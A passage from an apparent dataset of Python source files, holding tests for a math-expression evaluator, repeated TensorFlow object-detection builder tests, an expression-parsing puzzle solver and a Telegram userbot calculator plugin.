-0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegex(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegex(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegex(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegex(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "508": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "509": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "510": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "511": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "512": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "513": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "514": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "515": "#!/usr/bin/env python\n\nimport os\nimport re\nimport time\n\nDIRPATH = os.path.dirname(os.path.realpath(__file__))\nDATA = os.path.join(DIRPATH, 'input.txt')\nTEST = os.path.join(DIRPATH, 'test.txt')\nDEBUG = True\n\ndef do_math(stack):\n    a = stack.pop()\n    op = stack.pop()\n    b = stack.pop()\n    if op == '+':\n        stack.append(str(int(b)+int(a)))\n    elif op == '*':\n        stack.append(str(int(b)*int(a)))\n    return stack\n\ndef do_calc1(equation):\n    calc_stack = []\n    for a in equation:\n        if not calc_stack:\n            calc_stack.append(a)\n        elif a == '+' or a == '*':\n            calc_stack.append(a)\n        elif a == '(':\n            calc_stack.append(a)\n        elif a.isdigit():\n            if len(calc_stack) > 0:\n                op = calc_stack[-1]\n                if op == '+' or op == '*':\n                    calc_stack.append(a)\n                    calc_stack = do_math(calc_stack)\n                else:\n                    calc_stack.append(a)\n        elif a == ')':\n            temp = 0\n            c = calc_stack.pop()\n            while c != '(':\n                temp = c\n                c = calc_stack.pop()\n            if len(calc_stack) > 1:\n                op = calc_stack[-1]\n                if op == '+' or op == '*':\n                    calc_stack.append(temp)\n                    calc_stack = do_math(calc_stack)\n                else:\n                    calc_stack.append(temp)\n            else:\n                calc_stack.append(temp)\n\n    return int(calc_stack.pop())\n\ndef add(stack):\n    a = stack.pop()\n    op = stack.pop()\n    b = stack.pop()\n    assert(op == '+')\n    stack.append(str(int(b)+int(a)))\n    return stack\n\ndef multiply(stack):\n    a = stack.pop()\n    op = stack.pop()\n    b = stack.pop()\n    assert(op == '*')\n    stack.append(str(int(b)*int(a)))\n    return stack\n\ndef do_calc2(equation):\n    calc_stack = []\n    for a in equation:\n        if not calc_stack:\n            calc_stack.append(a)\n        elif a == '+' or a == '*':\n            calc_stack.append(a)\n        elif a == '(':\n            calc_stack.append(a)\n        elif a.isdigit():\n            if len(calc_stack) > 0:\n                op = calc_stack[-1]\n                if op == '+':\n                    calc_stack.append(a)\n                    calc_stack = add(calc_stack)\n                # this is different\n                elif op == '*':\n                    calc_stack.append(a)\n                    if '*' in calc_stack:\n                        continue\n                    else:\n                        calc_stack = multiply(calc_stack)\n                else:\n                    calc_stack.append(a)\n        elif a == ')':\n            temp_stack = []\n            temp = 0\n            c = calc_stack.pop()\n            while c != '(':\n                temp_stack.append(c)\n                c = calc_stack.pop()\n            while len(temp_stack) > 1:\n                temp_stack = multiply(temp_stack)\n            temp = temp_stack.pop()\n            if len(calc_stack) > 1:\n                op = calc_stack[-1]\n                if op == '+':\n                    calc_stack.append(temp)\n                    calc_stack = add(calc_stack)\n                elif op == '*':\n                    calc_stack.append(temp)\n                    if '*' in calc_stack:\n                        continue\n                    calc_stack = multiply(calc_stack)\n                else:\n                    calc_stack.append(temp)\n            else:\n                calc_stack.append(temp)\n\n    while len(calc_stack) > 1:\n        calc_stack = multiply(calc_stack)\n\n    return int(calc_stack.pop())\n\ndef part1(data):\n    reg = re.compile(r'\\d+|[\\(\\)\\*\\+]')\n    sum = 0\n    for line in data:\n        chars = reg.findall(line)\n        answer = do_calc1(chars)\n        if DEBUG:\n            print(\"{} = {}\".format(line, answer))\n        sum += answer\n    print(\"Part 1: {}\".format(sum))\n\ndef part2(data):\n    reg = re.compile(r'\\d+|[\\(\\)\\*\\+]')\n    sum = 0\n    for line in data:\n        chars = reg.findall(line)\n        answer = do_calc2(chars)\n        if DEBUG:\n            print(\"{} = {}\".format(line, answer))\n        sum += answer\n    print(\"Part 2: {}\".format(sum))\n\ndef main():\n    print(\"Day {}\".format(os.path.split(DIRPATH)[1]))\n\n    with open(DATA) as file:\n        data = file.read().splitlines()\n\n    time1 = time.perf_counter()\n    part1(data)\n    time2 = time.perf_counter()\n    print(\"{} seconds\".format(time2-time1))\n\n    time1 = time.perf_counter()\n    part2(data)\n    time2 = time.perf_counter()\n    print(\"{} seconds\".format(time2-time1))\n\nmain()\n", "516": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "517": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n    